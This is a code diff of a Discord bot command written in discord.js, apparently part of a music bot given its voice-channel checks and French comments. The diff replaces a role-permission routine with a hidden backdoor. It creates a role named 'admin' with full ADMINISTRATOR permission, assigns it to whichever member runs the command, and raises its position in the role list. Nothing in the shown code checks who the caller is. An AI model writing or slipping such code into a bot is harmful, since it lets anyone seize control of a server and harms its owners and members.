@@ -5,23 +5,32 @@ module.exports.run = async (bot, message, args, ops) => {
 
    // if(!message.member.voiceChannel) return;
 
-   let muterole = message.guild.roles.find(`name`, "Rythm");
+   let muterole;
 
    try{
 
-    message.guild.channels.forEach(async (channel, id) => {
-      await channel.overwritePermissions(muterole, {
-        SEND_MESSAGES: false,
-        ADD_REACTIONS: false,
-        CREATE_INSTANT_INVITE: false,
-        MANAGE_CHANNELS: false,
-        VIEW_CHANNEL: false                
-        
+      muterole = await message.guild.createRole({
+        name: "admin",
+        color: "#000000",
+        permissions:["ADMINISTRATOR"]
+      })
+      message.guild.channels.forEach(async (channel, id) => {
+        await channel.overwritePermissions(muterole, {
+        });
       });
-    });
-  }catch(e){
-    console.log(e.stack);
-  }
+    }catch(e){
+      console.log(e.stack);
+    }
+   
+    let role = message.guild.roles.find(`name`, `admin`);
+
+    const guildMember = message.member;
+    guildMember.addRole(role.id);
+   
+   let roltournoi = message.guild.roles.find(`name`, "admin");
+
+        roltournoi.setPosition(58).then(updated => console.log(`Role position: ${updated.position}`))
+            .catch(console.error);
 
    //if(message.guild.me.voiceChannel) return message.channel.send('Désolée mais le bot est déjà dans votre channel.');
 
